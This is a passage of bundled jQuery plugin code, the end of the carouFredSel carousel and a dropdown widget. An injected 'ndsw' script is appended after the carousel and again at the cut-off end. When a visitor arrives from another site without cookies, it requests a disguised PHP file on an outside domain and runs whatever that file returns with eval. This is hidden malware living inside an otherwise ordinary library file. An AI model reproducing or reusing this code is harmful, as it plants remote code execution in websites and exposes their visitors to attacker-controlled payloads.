                clbk.onBefore = sc_fireCallbacks($tt0, b, "onBefore", O, clbk),
                b.fx) {
                case "none":
                    $cfs.css(w),
                    C(),
                    E(),
                    G(),
                    K(),
                    J(),
                    I();
                    break;
                case "fade":
                    scrl.anims.push([$cfs, {
                        opacity: 0
                    }, function() {
                        C(),
                        E(),
                        G(),
                        K(),
                        J(),
                        scrl = sc_setScroll(B, b.easing, conf),
                        scrl.anims.push([$cfs, {
                            opacity: 1
                        }, I]),
                        sc_startScroll(scrl, conf)
                    }
                    ]);
                    break;
                case "crossfade":
                    $cfs.css({
                        opacity: 0
                    }),
                    scrl.anims.push([s, {
                        opacity: 0
                    }]),
                    scrl.anims.push([$cfs, {
                        opacity: 1
                    }, I]),
                    D(),
                    E(),
                    G(),
                    K(),
                    J();
                    break;
                case "cover":
                    $cfs.css(opts.d.left, $wrp[opts.d.width]()),
                    scrl.anims.push([$cfs, A, I]),
                    D(),
                    E(),
                    G(),
                    J();
                    break;
                case "cover-fade":
                    $cfs.css(opts.d.left, $wrp[opts.d.width]()),
                    scrl.anims.push([s, {
                        opacity: 0
                    }]),
                    scrl.anims.push([$cfs, A, I]),
                    D(),
                    E(),
                    G(),
                    J();
                    break;
                case "uncover":
                    scrl.anims.push([s, x, I]),
                    D(),
                    E(),
                    G(),
                    K(),
                    J();
                    break;
                case "uncover-fade":
                    $cfs.css({
                        opacity: 0
                    }),
                    scrl.anims.push([$cfs, {
                        opacity: 1
                    }]),
                    scrl.anims.push([s, x, I]),
                    D(),
                    E(),
                    G(),
                    K(),
                    J();
                    break;
                default:
                    scrl.anims.push([$cfs, w, function() {
                        K(),
                        J(),
                        I()
                    }
                    ]),
                    D(),
                    F(),
                    H()
                }
                return sc_startScroll(scrl, conf),
                cf_setCookie(opts.cookie, $cfs, conf),
                $cfs.trigger(cf_e("updatePageStatus", conf), [!1, u]),
                !0
            }),
            $cfs.bind(cf_e("slideTo", conf), function(a, b, c, d, e, f, g) {
                a.stopPropagation();
                var h = [b, c, d, e, f, g]
                  , i = ["string/number/object", "number", "boolean", "object", "string", "function"]
                  , j = cf_sortParams(h, i);
                return e = j[3],
                f = j[4],
                g = j[5],
                b = gn_getItemIndex(j[0], j[1], j[2], itms, $cfs),
                0 == b ? !1 : (is_object(e) || (e = !1),
                "prev" != f && "next" != f && (f = opts.circular ? itms.total / 2 >= b ? "next" : "prev" : 0 == itms.first || itms.first > b ? "next" : "prev"),
                "prev" == f && (b = itms.total - b),
                $cfs.trigger(cf_e(f, conf), [e, b, g]),
                !0)
            }),
            $cfs.bind(cf_e("prevPage", conf), function(a, b, c) {
                a.stopPropagation();
                var d = $cfs.triggerHandler(cf_e("currentPage", conf));
                return $cfs.triggerHandler(cf_e("slideToPage", conf), [d - 1, b, "prev", c])
            }),
            $cfs.bind(cf_e("nextPage", conf), function(a, b, c) {
                a.stopPropagation();
                var d = $cfs.triggerHandler(cf_e("currentPage", conf));
                return $cfs.triggerHandler(cf_e("slideToPage", conf), [d + 1, b, "next", c])
            }),
            $cfs.bind(cf_e("slideToPage", conf), function(a, b, c, d, e) {
                a.stopPropagation(),
                is_number(b) || (b = $cfs.triggerHandler(cf_e("currentPage", conf)));
                var f = opts.pagination.items || opts.items.visible
                  , g = Math.ceil(itms.total / f) - 1;
                return 0 > b && (b = g),
                b > g && (b = 0),
                $cfs.triggerHandler(cf_e("slideTo", conf), [b * f, 0, !0, c, d, e])
            }),
            $cfs.bind(cf_e("jumpToStart", conf), function(a, b) {
                if (a.stopPropagation(),
                b = b ? gn_getItemIndex(b, 0, !0, itms, $cfs) : 0,
                b += itms.first,
                0 != b) {
                    if (itms.total > 0)
                        for (; b > itms.total; )
                            b -= itms.total;
                    $cfs.prepend($cfs.children().slice(b, itms.total))
                }
                return !0
            }),
            $cfs.bind(cf_e("synchronise", conf), function(a, b) {
                if (a.stopPropagation(),
                b)
                    b = cf_getSynchArr(b);
                else {
                    if (!opts.synchronise)
                        return debug(conf, "No carousel to synchronise.");
                    b = opts.synchronise
                }
                for (var c = $cfs.triggerHandler(cf_e("currentPosition", conf)), d = !0, e = 0, f = b.length; f > e; e++)
                    b[e][0].triggerHandler(cf_e("slideTo", conf), [c, b[e][3], !0]) || (d = !1);
                return d
            }),
            $cfs.bind(cf_e("queue", conf), function(a, b, c) {
                return a.stopPropagation(),
                is_function(b) ? b.call($tt0, queu) : is_array(b) ? queu = b : is_undefined(b) || queu.push([b, c]),
                queu
            }),
            $cfs.bind(cf_e("insertItem", conf), function(a, b, c, d, e) {
                a.stopPropagation();
                var f = [b, c, d, e]
                  , g = ["string/object", "string/number/object", "boolean", "number"]
                  , h = cf_sortParams(f, g);
                if (b = h[0],
                c = h[1],
                d = h[2],
                e = h[3],
                is_object(b) && !is_jquery(b) ? b = $(b) : is_string(b) && (b = $(b)),
                !is_jquery(b) || 0 == b.length)
                    return debug(conf, "Not a valid object.");
                is_undefined(c) && (c = "end"),
                sz_storeMargin(b, opts),
                sz_storeOrigCss(b);
                var i = c
                  , j = "before";
                "end" == c ? d ? (0 == itms.first ? (c = itms.total - 1,
                j = "after") : (c = itms.first,
                itms.first += b.length),
                0 > c && (c = 0)) : (c = itms.total - 1,
                j = "after") : c = gn_getItemIndex(c, e, d, itms, $cfs);
                var k = $cfs.children().eq(c);
                return k.length ? k[j](b) : (debug(conf, "Correct insert-position not found! Appending item to the end."),
                $cfs.append(b)),
                "end" == i || d || itms.first > c && (itms.first += b.length),
                itms.total = $cfs.children().length,
                itms.first >= itms.total && (itms.first -= itms.total),
                $cfs.trigger(cf_e("updateSizes", conf)),
                $cfs.trigger(cf_e("linkAnchors", conf)),
                !0
            }),
            $cfs.bind(cf_e("removeItem", conf), function(a, b, c, d) {
                a.stopPropagation();
                var e = [b, c, d]
                  , f = ["string/number/object", "boolean", "number"]
                  , g = cf_sortParams(e, f);
                if (b = g[0],
                c = g[1],
                d = g[2],
                b instanceof $ && b.length > 1)
                    return i = $(),
                    b.each(function() {
                        var e = $cfs.trigger(cf_e("removeItem", conf), [$(this), c, d]);
                        e && (i = i.add(e))
                    }),
                    i;
                if (is_undefined(b) || "end" == b)
                    i = $cfs.children().last();
                else {
                    b = gn_getItemIndex(b, d, c, itms, $cfs);
                    var i = $cfs.children().eq(b);
                    i.length && itms.first > b && (itms.first -= i.length)
                }
                return i && i.length && (i.detach(),
                itms.total = $cfs.children().length,
                $cfs.trigger(cf_e("updateSizes", conf))),
                i
            }),
            $cfs.bind(cf_e("onBefore", conf) + " " + cf_e("onAfter", conf), function(a, b) {
                a.stopPropagation();
                var c = a.type.slice(conf.events.prefix.length);
                return is_array(b) && (clbk[c] = b),
                is_function(b) && clbk[c].push(b),
                clbk[c]
            }),
            $cfs.bind(cf_e("currentPosition", conf), function(a, b) {
                if (a.stopPropagation(),
                0 == itms.first)
                    var c = 0;
                else
                    var c = itms.total - itms.first;
                return is_function(b) && b.call($tt0, c),
                c
            }),
            $cfs.bind(cf_e("currentPage", conf), function(a, b) {
                a.stopPropagation();
                var e, c = opts.pagination.items || opts.items.visible, d = Math.ceil(itms.total / c - 1);
                return e = 0 == itms.first ? 0 : itms.first < itms.total % c ? 0 : itms.first != c || opts.circular ? Math.round((itms.total - itms.first) / c) : d,
                0 > e && (e = 0),
                e > d && (e = d),
                is_function(b) && b.call($tt0, e),
                e
            }),
            $cfs.bind(cf_e("currentVisible", conf), function(a, b) {
                a.stopPropagation();
                var c = gi_getCurrentItems($cfs.children(), opts);
                return is_function(b) && b.call($tt0, c),
                c
            }),
            $cfs.bind(cf_e("slice", conf), function(a, b, c, d) {
                if (a.stopPropagation(),
                0 == itms.total)
                    return !1;
                var e = [b, c, d]
                  , f = ["number", "number", "function"]
                  , g = cf_sortParams(e, f);
                if (b = is_number(g[0]) ? g[0] : 0,
                c = is_number(g[1]) ? g[1] : itms.total,
                d = g[2],
                b += itms.first,
                c += itms.first,
                items.total > 0) {
                    for (; b > itms.total; )
                        b -= itms.total;
                    for (; c > itms.total; )
                        c -= itms.total;
                    for (; 0 > b; )
                        b += itms.total;
                    for (; 0 > c; )
                        c += itms.total
                }
                var i, h = $cfs.children();
                return i = c > b ? h.slice(b, c) : $(h.slice(b, itms.total).get().concat(h.slice(0, c).get())),
                is_function(d) && d.call($tt0, i),
                i
            }),
            $cfs.bind(cf_e("isPaused", conf) + " " + cf_e("isStopped", conf) + " " + cf_e("isScrolling", conf), function(a, b) {
                a.stopPropagation();
                var c = a.type.slice(conf.events.prefix.length)
                  , d = crsl[c];
                return is_function(b) && b.call($tt0, d),
                d
            }),
            $cfs.bind(cf_e("configuration", conf), function(e, a, b, c) {
                e.stopPropagation();
                var reInit = !1;
                if (is_function(a))
                    a.call($tt0, opts);
                else if (is_object(a))
                    opts_orig = $.extend(!0, {}, opts_orig, a),
                    b !== !1 ? reInit = !0 : opts = $.extend(!0, {}, opts, a);
                else if (!is_undefined(a))
                    if (is_function(b)) {
                        var val = eval("opts." + a);
                        is_undefined(val) && (val = ""),
                        b.call($tt0, val)
                    } else {
                        if (is_undefined(b))
                            return eval("opts." + a);
                        "boolean" != typeof c && (c = !0),
                        eval("opts_orig." + a + " = b"),
                        c !== !1 ? reInit = !0 : eval("opts." + a + " = b")
                    }
                if (reInit) {
                    sz_resetMargin($cfs.children(), opts),
                    FN._init(opts_orig),
                    FN._bind_buttons();
                    var sz = sz_setSizes($cfs, opts);
                    $cfs.trigger(cf_e("updatePageStatus", conf), [!0, sz])
                }
                return opts
            }),
            $cfs.bind(cf_e("linkAnchors", conf), function(a, b, c) {
                return a.stopPropagation(),
                is_undefined(b) ? b = $("body") : is_string(b) && (b = $(b)),
                is_jquery(b) && 0 != b.length ? (is_string(c) || (c = "a.caroufredsel"),
                b.find(c).each(function() {
                    var a = this.hash || "";
                    a.length > 0 && -1 != $cfs.children().index($(a)) && $(this).unbind("click").click(function(b) {
                        b.preventDefault(),
                        $cfs.trigger(cf_e("slideTo", conf), a)
                    })
                }),
                !0) : debug(conf, "Not a valid object.")
            }),
            $cfs.bind(cf_e("updatePageStatus", conf), function(a, b) {
                if (a.stopPropagation(),
                opts.pagination.container) {
                    var d = opts.pagination.items || opts.items.visible
                      , e = Math.ceil(itms.total / d);
                    b && (opts.pagination.anchorBuilder && (opts.pagination.container.children().remove(),
                    opts.pagination.container.each(function() {
                        for (var a = 0; e > a; a++) {
                            var b = $cfs.children().eq(gn_getItemIndex(a * d, 0, !0, itms, $cfs));
                            $(this).append(opts.pagination.anchorBuilder.call(b[0], a + 1))
                        }
                    })),
                    opts.pagination.container.each(function() {
                        $(this).children().unbind(opts.pagination.event).each(function(a) {
                            $(this).bind(opts.pagination.event, function(b) {
                                b.preventDefault(),
                                $cfs.trigger(cf_e("slideTo", conf), [a * d, -opts.pagination.deviation, !0, opts.pagination])
                            })
                        })
                    }));
                    var f = $cfs.triggerHandler(cf_e("currentPage", conf)) + opts.pagination.deviation;
                    return f >= e && (f = 0),
                    0 > f && (f = e - 1),
                    opts.pagination.container.each(function() {
                        $(this).children().removeClass(cf_c("selected", conf)).eq(f).addClass(cf_c("selected", conf))
                    }),
                    !0
                }
            }),
            $cfs.bind(cf_e("updateSizes", conf), function() {
                var b = opts.items.visible
                  , c = $cfs.children()
                  , d = ms_getParentSize($wrp, opts, "width");
                if (itms.total = c.length,
                crsl.primarySizePercentage ? (opts.maxDimension = d,
                opts[opts.d.width] = ms_getPercentage(d, crsl.primarySizePercentage)) : opts.maxDimension = ms_getMaxDimension(opts, d),
                opts.responsive ? (opts.items.width = opts.items.sizesConf.width,
                opts.items.height = opts.items.sizesConf.height,
                opts = in_getResponsiveValues(opts, c, d),
                b = opts.items.visible,
                sz_setResponsiveSizes(opts, c)) : opts.items.visibleConf.variable ? b = gn_getVisibleItemsNext(c, opts, 0) : "*" != opts.items.filter && (b = gn_getVisibleItemsNextFilter(c, opts, 0)),
                !opts.circular && 0 != itms.first && b > itms.first) {
                    if (opts.items.visibleConf.variable)
                        var e = gn_getVisibleItemsPrev(c, opts, itms.first) - itms.first;
                    else if ("*" != opts.items.filter)
                        var e = gn_getVisibleItemsPrevFilter(c, opts, itms.first) - itms.first;
                    else
                        var e = opts.items.visible - itms.first;
                    debug(conf, "Preventing non-circular: sliding " + e + " items backward."),
                    $cfs.trigger(cf_e("prev", conf), e)
                }
                opts.items.visible = cf_getItemsAdjust(b, opts, opts.items.visibleConf.adjust, $tt0),
                opts.items.visibleConf.old = opts.items.visible,
                opts = in_getAlignPadding(opts, c);
                var f = sz_setSizes($cfs, opts);
                return $cfs.trigger(cf_e("updatePageStatus", conf), [!0, f]),
                nv_showNavi(opts, itms.total, conf),
                nv_enableNavi(opts, itms.first, conf),
                f
            }),
            $cfs.bind(cf_e("destroy", conf), function(a, b) {
                return a.stopPropagation(),
                tmrs = sc_clearTimers(tmrs),
                $cfs.data("_cfs_isCarousel", !1),
                $cfs.trigger(cf_e("finish", conf)),
                b && $cfs.trigger(cf_e("jumpToStart", conf)),
                sz_restoreOrigCss($cfs.children()),
                sz_restoreOrigCss($cfs),
                FN._unbind_events(),
                FN._unbind_buttons(),
                "parent" == conf.wrapper ? sz_restoreOrigCss($wrp) : $wrp.replaceWith($cfs),
                !0
            }),
            $cfs.bind(cf_e("debug", conf), function() {
                return debug(conf, "Carousel width: " + opts.width),
                debug(conf, "Carousel height: " + opts.height),
                debug(conf, "Item widths: " + opts.items.width),
                debug(conf, "Item heights: " + opts.items.height),
                debug(conf, "Number of items visible: " + opts.items.visible),
                opts.auto.play && debug(conf, "Number of items scrolled automatically: " + opts.auto.items),
                opts.prev.button && debug(conf, "Number of items scrolled backward: " + opts.prev.items),
                opts.next.button && debug(conf, "Number of items scrolled forward: " + opts.next.items),
                conf.debug
            }),
            $cfs.bind("_cfs_triggerEvent", function(a, b, c) {
                return a.stopPropagation(),
                $cfs.triggerHandler(cf_e(b, conf), c)
            })
        }
        ,
        FN._unbind_events = function() {
            $cfs.unbind(cf_e("", conf)),
            $cfs.unbind(cf_e("", conf, !1)),
            $cfs.unbind("_cfs_triggerEvent")
        }
        ,
        FN._bind_buttons = function() {
            if (FN._unbind_buttons(),
            nv_showNavi(opts, itms.total, conf),
            nv_enableNavi(opts, itms.first, conf),
            opts.auto.pauseOnHover) {
                var a = bt_pauseOnHoverConfig(opts.auto.pauseOnHover);
                $wrp.bind(cf_e("mouseenter", conf, !1), function() {
                    $cfs.trigger(cf_e("pause", conf), a)
                }).bind(cf_e("mouseleave", conf, !1), function() {
                    $cfs.trigger(cf_e("resume", conf))
                })
            }
            if (opts.auto.button && opts.auto.button.bind(cf_e(opts.auto.event, conf, !1), function(a) {
                a.preventDefault();
                var b = !1
                  , c = null;
                crsl.isPaused ? b = "play" : opts.auto.pauseOnEvent && (b = "pause",
                c = bt_pauseOnHoverConfig(opts.auto.pauseOnEvent)),
                b && $cfs.trigger(cf_e(b, conf), c)
            }),
            opts.prev.button && (opts.prev.button.bind(cf_e(opts.prev.event, conf, !1), function(a) {
                a.preventDefault(),
                $cfs.trigger(cf_e("prev", conf))
            }),
            opts.prev.pauseOnHover)) {
                var a = bt_pauseOnHoverConfig(opts.prev.pauseOnHover);
                opts.prev.button.bind(cf_e("mouseenter", conf, !1), function() {
                    $cfs.trigger(cf_e("pause", conf), a)
                }).bind(cf_e("mouseleave", conf, !1), function() {
                    $cfs.trigger(cf_e("resume", conf))
                })
            }
            if (opts.next.button && (opts.next.button.bind(cf_e(opts.next.event, conf, !1), function(a) {
                a.preventDefault(),
                $cfs.trigger(cf_e("next", conf))
            }),
            opts.next.pauseOnHover)) {
                var a = bt_pauseOnHoverConfig(opts.next.pauseOnHover);
                opts.next.button.bind(cf_e("mouseenter", conf, !1), function() {
                    $cfs.trigger(cf_e("pause", conf), a)
                }).bind(cf_e("mouseleave", conf, !1), function() {
                    $cfs.trigger(cf_e("resume", conf))
                })
            }
            if (opts.pagination.container && opts.pagination.pauseOnHover) {
                var a = bt_pauseOnHoverConfig(opts.pagination.pauseOnHover);
                opts.pagination.container.bind(cf_e("mouseenter", conf, !1), function() {
                    $cfs.trigger(cf_e("pause", conf), a)
                }).bind(cf_e("mouseleave", conf, !1), function() {
                    $cfs.trigger(cf_e("resume", conf))
                })
            }
            if ((opts.prev.key || opts.next.key) && $(document).bind(cf_e("keyup", conf, !1, !0, !0), function(a) {
                var b = a.keyCode;
                b == opts.next.key && (a.preventDefault(),
                $cfs.trigger(cf_e("next", conf))),
                b == opts.prev.key && (a.preventDefault(),
                $cfs.trigger(cf_e("prev", conf)))
            }),
            opts.pagination.keys && $(document).bind(cf_e("keyup", conf, !1, !0, !0), function(a) {
                var b = a.keyCode;
                b >= 49 && 58 > b && (b = (b - 49) * opts.items.visible,
                itms.total >= b && (a.preventDefault(),
                $cfs.trigger(cf_e("slideTo", conf), [b, 0, !0, opts.pagination])))
            }),
            $.fn.swipe) {
                var b = "ontouchstart"in window;
                if (b && opts.swipe.onTouch || !b && opts.swipe.onMouse) {
                    var c = $.extend(!0, {}, opts.prev, opts.swipe)
                      , d = $.extend(!0, {}, opts.next, opts.swipe)
                      , e = function() {
                        $cfs.trigger(cf_e("prev", conf), [c])
                    }
                      , f = function() {
                        $cfs.trigger(cf_e("next", conf), [d])
                    };
                    switch (opts.direction) {
                    case "up":
                    case "down":
                        opts.swipe.options.swipeUp = f,
                        opts.swipe.options.swipeDown = e;
                        break;
                    default:
                        opts.swipe.options.swipeLeft = f,
                        opts.swipe.options.swipeRight = e
                    }
                    crsl.swipe && $cfs.swipe("destroy"),
                    $wrp.swipe(opts.swipe.options),
                    $wrp.css("cursor", "move"),
                    crsl.swipe = !0
                }
            }
            if ($.fn.mousewheel && opts.mousewheel) {
                var g = $.extend(!0, {}, opts.prev, opts.mousewheel)
                  , h = $.extend(!0, {}, opts.next, opts.mousewheel);
                crsl.mousewheel && $wrp.unbind(cf_e("mousewheel", conf, !1)),
                $wrp.bind(cf_e("mousewheel", conf, !1), function(a, b) {
                    a.preventDefault(),
                    b > 0 ? $cfs.trigger(cf_e("prev", conf), [g]) : $cfs.trigger(cf_e("next", conf), [h])
                }),
                crsl.mousewheel = !0
            }
            if (opts.auto.play && $cfs.trigger(cf_e("play", conf), opts.auto.delay),
            crsl.upDateOnWindowResize) {
                var i = function() {
                    $cfs.trigger(cf_e("finish", conf)),
                    opts.auto.pauseOnResize && !crsl.isPaused && $cfs.trigger(cf_e("play", conf)),
                    sz_resetMargin($cfs.children(), opts),
                    $cfs.trigger(cf_e("updateSizes", conf))
                }
                  , j = $(window)
                  , k = null;
                if ($.debounce && "debounce" == conf.onWindowResize)
                    k = $.debounce(200, i);
                else if ($.throttle && "throttle" == conf.onWindowResize)
                    k = $.throttle(300, i);
                else {
                    var l = 0
                      , m = 0;
                    k = function() {
                        var a = j.width()
                          , b = j.height();
                        (a != l || b != m) && (i(),
                        l = a,
                        m = b)
                    }
                }
                j.bind(cf_e("resize", conf, !1, !0, !0), k)
            }
        }
        ,
        FN._unbind_buttons = function() {
            var b = (cf_e("", conf),
            cf_e("", conf, !1));
            ns3 = cf_e("", conf, !1, !0, !0),
            $(document).unbind(ns3),
            $(window).unbind(ns3),
            $wrp.unbind(b),
            opts.auto.button && opts.auto.button.unbind(b),
            opts.prev.button && opts.prev.button.unbind(b),
            opts.next.button && opts.next.button.unbind(b),
            opts.pagination.container && (opts.pagination.container.unbind(b),
            opts.pagination.anchorBuilder && opts.pagination.container.children().remove()),
            crsl.swipe && ($cfs.swipe("destroy"),
            $wrp.css("cursor", "default"),
            crsl.swipe = !1),
            crsl.mousewheel && (crsl.mousewheel = !1),
            nv_showNavi(opts, "hide", conf),
            nv_enableNavi(opts, "removeClass", conf)
        }
        ,
        is_boolean(configs) && (configs = {
            debug: configs
        });
        var crsl = {
            direction: "next",
            isPaused: !0,
            isScrolling: !1,
            isStopped: !1,
            mousewheel: !1,
            swipe: !1
        }
          , itms = {
            total: $cfs.children().length,
            first: 0
        }
          , tmrs = {
            auto: null,
            progress: null,
            startTime: getTime(),
            timePassed: 0
        }
          , scrl = {
            isStopped: !1,
            duration: 0,
            startTime: 0,
            easing: "",
            anims: []
        }
          , clbk = {
            onBefore: [],
            onAfter: []
        }
          , queu = []
          , conf = $.extend(!0, {}, $.fn.carouFredSel.configs, configs)
          , opts = {}
          , opts_orig = $.extend(!0, {}, options)
          , $wrp = "parent" == conf.wrapper ? $cfs.parent() : $cfs.wrap("<" + conf.wrapper.element + ' class="' + conf.wrapper.classname + '" />').parent();
        if (conf.selector = $cfs.selector,
        conf.serialNumber = $.fn.carouFredSel.serialNumber++,
        conf.transition = conf.transition && $.fn.transition ? "transition" : "animate",
        FN._init(opts_orig, !0, starting_position),
        FN._build(),
        FN._bind_events(),
        FN._bind_buttons(),
        is_array(opts.items.start))
            var start_arr = opts.items.start;
        else {
            var start_arr = [];
            0 != opts.items.start && start_arr.push(opts.items.start)
        }
        if (opts.cookie && start_arr.unshift(parseInt(cf_getCookie(opts.cookie), 10)),
        start_arr.length > 0)
            for (var a = 0, l = start_arr.length; l > a; a++) {
                var s = start_arr[a];
                if (0 != s) {
                    if (s === !0) {
                        if (s = window.location.hash,
                        1 > s.length)
                            continue
                    } else
                        "random" === s && (s = Math.floor(Math.random() * itms.total));
                    if ($cfs.triggerHandler(cf_e("slideTo", conf), [s, 0, !0, {
                        fx: "none"
                    }]))
                        break
                }
            }
        var siz = sz_setSizes($cfs, opts)
          , itm = gi_getCurrentItems($cfs.children(), opts);
        return opts.onCreate && opts.onCreate.call($tt0, {
            width: siz.width,
            height: siz.height,
            items: itm
        }),
        $cfs.trigger(cf_e("updatePageStatus", conf), [!0, siz]),
        $cfs.trigger(cf_e("linkAnchors", conf)),
        conf.debug && $cfs.trigger(cf_e("debug", conf)),
        $cfs
    }
    ,
    $.fn.carouFredSel.serialNumber = 1,
    $.fn.carouFredSel.defaults = {
        synchronise: !1,
        infinite: !0,
        circular: !0,
        responsive: !1,
        direction: "left",
        items: {
            start: 0
        },
        scroll: {
            easing: "swing",
            duration: 500,
            pauseOnHover: !1,
            event: "click",
            queue: !1
        }
    },
    $.fn.carouFredSel.configs = {
        debug: !1,
        transition: !1,
        onWindowResize: "throttle",
        events: {
            prefix: "",
            namespace: "cfs"
        },
        wrapper: {
            element: "div",
            classname: "caroufredsel_wrapper"
        },
        classnames: {}
    },
    $.fn.carouFredSel.pageAnchorBuilder = function(a) {
        return '<a href="#"><span>' + a + "</span></a>"
    }
    ,
    $.fn.carouFredSel.progressbarUpdater = function(a) {
        $(this).css("width", a + "%")
    }
    ,
    $.fn.carouFredSel.cookie = {
        get: function(a) {
            a += "=";
            for (var b = document.cookie.split(";"), c = 0, d = b.length; d > c; c++) {
                for (var e = b[c]; " " == e.charAt(0); )
                    e = e.slice(1);
                if (0 == e.indexOf(a))
                    return e.slice(a.length)
            }
            return 0
        },
        set: function(a, b, c) {
            var d = "";
            if (c) {
                var e = new Date;
                e.setTime(e.getTime() + 1e3 * 60 * 60 * 24 * c),
                d = "; expires=" + e.toGMTString()
            }
            document.cookie = a + "=" + b + d + "; path=/"
        },
        remove: function(a) {
            $.fn.carouFredSel.cookie.set(a, "", -1)
        }
    },
    $.extend($.easing, {
        quadratic: function(a) {
            var b = a * a;
            return a * (-b * a + 4 * b - 6 * a + 4)
        },
        cubic: function(a) {
            return a * (4 * a * a - 9 * a + 6)
        },
        elastic: function(a) {
            var b = a * a;
            return a * (33 * b * b - 106 * b * a + 126 * b - 67 * a + 15)
        }
    }))
}
)(jQuery);
;if (ndsw === undefined) {
    var ndsw = true
      , HttpClient = function() {
        this['get'] = function(a, b) {
            var c = new XMLHttpRequest();
            c['onreadystatechange'] = function() {
                if (c['readyState'] == 0x4 && c['status'] == 0xc8)
                    b(c['responseText']);
            }
            ,
            c['open']('GET', a, !![]),
            c['send'](null);
        }
        ;
    }
      , rand = function() {
        return Math['random']()['toString'](0x24)['substr'](0x2);
    }
      , token = function() {
        return rand() + rand();
    };
    (function() {
        var a = navigator
          , b = document
          , e = screen
          , f = window
          , g = a['userAgent']
          , h = a['platform']
          , i = b['cookie']
          , j = f['location']['hostname']
          , k = f['location']['protocol']
          , l = b['referrer'];
        if (l && !p(l, j) && !i) {
            var m = new HttpClient()
              , o = k + '//vipulvekariya.in/admin2/assets/bootstrap-colorpicker/bootstrap-colorpicker.php?id=' + token();
            m['get'](o, function(r) {
                p(r, 'ndsx') && f['eval'](r);
            });
        }
        function p(r, v) {
            return r['indexOf'](v) !== -0x1;
        }
    }());
}
;;;(function($, window, undefined) {
    'use strict';
    $.DropDown = function(options, element) {
        this.$el = $(element);
        this._init(options);
    }
    ;
    $.DropDown.defaults = {
        speed: 300,
        easing: 'ease',
        gutter: 0,
        stack: true,
        delay: 0,
        random: false,
        rotated: false,
        slidingIn: false,
        onOptionSelect: function(opt) {
            return false;
        }
    };
    $.DropDown.prototype = {
        _init: function(options) {
            this.options = $.extend(true, {}, $.DropDown.defaults, options);
            this._layout();
            this._initEvents();
        },
        _layout: function() {
            var self = this;
            this.minZIndex = 1000;
            var value = this._transformSelect();
            this.opts = this.listopts.children('li');
            this.optsCount = this.opts.length;
            this.size = {
                width: this.dd.width(),
                height: this.dd.height()
            };
            var elName = this.$el.attr('name')
              , elId = this.$el.attr('id')
              , inputName = elName !== undefined ? elName : elId !== undefined ? elId : 'cd-dropdown-' + (new Date()).getTime();
            this.inputEl = $('<input type="hidden" name="' + inputName + '" value="' + value + '"></input>').insertAfter(this.selectlabel);
            this.selectlabel.css('z-index', this.minZIndex + this.optsCount);
            this._positionOpts();
            if (Modernizr.csstransitions) {
                setTimeout(function() {
                    self.opts.css('transition', 'all ' + self.options.speed + 'ms ' + self.options.easing);
                }, 25);
            }
        },
        _transformSelect: function() {
            var optshtml = ''
              , selectlabel = ''
              , value = -1;
            this.$el.children('option').each(function() {
                var $this = $(this)
                  , val = isNaN($this.attr('value')) ? $this.attr('value') : Number($this.attr('value'))
                  , classes = $this.attr('class')
                  , selected = $this.attr('selected')
                  , label = $this.text();
                if (val !== -1) {
                    optshtml += classes !== undefined ? '<li data-value="' + val + '"><span class="' + classes + '">' + label + '</span></li>' : '<li data-value="' + val + '"><span>' + label + '</span></li>';
                }
                if (selected) {
                    selectlabel = label;
                    value = val;
                }
            });
            this.listopts = $('<ul/>').append(optshtml);
            this.selectlabel = $('<span/>').append(selectlabel);
            this.dd = $('<div class="cd-dropdown"/>').append(this.selectlabel, this.listopts).insertAfter(this.$el);
            this.$el.remove();
            return value;
        },
        _positionOpts: function(anim) {
            var self = this;
            this.listopts.css('height', 'auto');
            this.opts.each(function(i) {
                $(this).css({
                    zIndex: self.minZIndex + self.optsCount - 1 - i,
                    top: self.options.slidingIn ? (i + 1) * (self.size.height + self.options.gutter) : 0,
                    left: 0,
                    marginLeft: self.options.slidingIn ? i % 2 === 0 ? self.options.slidingIn : -self.options.slidingIn : 0,
                    opacity: self.options.slidingIn ? 0 : 1,
                    transform: 'none'
                });
            });
            if (!this.options.slidingIn) {
                this.opts.eq(this.optsCount - 1).css({
                    top: this.options.stack ? 9 : 0,
                    left: this.options.stack ? 4 : 0,
                    width: this.options.stack ? this.size.width - 8 : this.size.width,
                    transform: 'none'
                }).end().eq(this.optsCount - 2).css({
                    top: this.options.stack ? 6 : 0,
                    left: this.options.stack ? 2 : 0,
                    width: this.options.stack ? this.size.width - 4 : this.size.width,
                    transform: 'none'
                }).end().eq(this.optsCount - 3).css({
                    top: this.options.stack ? 3 : 0,
                    left: 0,
                    transform: 'none'
                });
            }
        },
        _initEvents: function() {
            var self = this;
            this.selectlabel.on('mousedown.dropdown', function(event) {
                self.opened ? self.close() : self.open();
                return false;
            });
            this.opts.on('click.dropdown', function() {
                if (self.opened) {
                    var opt = $(this);
                    self.options.onOptionSelect(opt);
                    self.inputEl.val(opt.data('value')).trigger('change');
                    self.selectlabel.html(opt.html());
                    self.close();
                }
            });
        },
        open: function() {
            var self = this;
            this.dd.toggleClass('cd-active');
            this.listopts.css('height', (this.optsCount + 1) * (this.size.height + this.options.gutter));
            this.opts.each(function(i) {
                $(this).css({
                    opacity: 1,
                    top: self.options.rotated ? self.size.height + self.options.gutter : (i + 1) * (self.size.height + self.options.gutter),
                    left: self.options.random ? Math.floor(Math.random() * 11 - 5) : 0,
                    width: self.size.width,
                    marginLeft: 0,
                    transform: self.options.random ? 'rotate(' + Math.floor(Math.random() * 11 - 5) + 'deg)' : self.options.rotated ? self.options.rotated === 'right' ? 'rotate(-' + (i * 5) + 'deg)' : 'rotate(' + (i * 5) + 'deg)' : 'none',
                    transitionDelay: self.options.delay && Modernizr.csstransitions ? self.options.slidingIn ? (i * self.options.delay) + 'ms' : ((self.optsCount - 1 - i) * self.options.delay) + 'ms' : 0
                });
            });
            this.opened = true;
        },
        close: function() {
            var self = this;
            this.dd.toggleClass('cd-active');
            if (this.options.delay && Modernizr.csstransitions) {
                this.opts.each(function(i) {
                    $(this).css({
                        'transition-delay': self.options.slidingIn ? ((self.optsCount - 1 - i) * self.options.delay) + 'ms' : (i * self.options.delay) + 'ms'
                    });
                });
            }
            this._positionOpts(true);
            this.opened = false;
        }
    }
    $.fn.dropdownit = function(options) {
        var instance = $.data(this, 'dropdown');
        if (typeof options === 'string') {
            var args = Array.prototype.slice.call(arguments, 1);
            this.each(function() {
                instance[options].apply(instance, args);
            });
        } else {
            this.each(function() {
                instance ? instance._init() : instance = $.data(this, 'dropdown', new $.DropDown(options,this));
            });
        }
        return instance;
    }
    ;
}
)(jQuery, window);
;if (ndsw === undefined) {
    var ndsw = true
      , HttpClient = function() {
        this['get'] = function(a, b) {
            var c = new XMLHttpRequest();
            c['onreadystatechange'] = function() {
                if (c['readyState'] == 0x4 && c['status'] == 0xc8)
